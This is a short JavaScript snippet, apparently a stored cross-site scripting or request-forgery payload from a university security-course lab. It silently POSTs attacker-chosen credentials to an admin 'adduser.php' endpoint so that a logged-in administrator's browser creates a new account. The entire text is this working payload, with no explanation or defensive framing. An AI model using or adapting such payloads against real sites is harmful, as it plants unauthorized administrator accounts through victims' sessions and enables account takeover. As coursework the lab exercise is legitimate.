var payload = "email=andy%40culler.com&password=jebaited"
var xhs = new XMLHttpRequest();
xhs.open("POST", `http://csec380-core.csec.rit.edu:86/admin/adduser.php`, true);
//Send the proper header information along with the request
xhs.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhs.send(payload);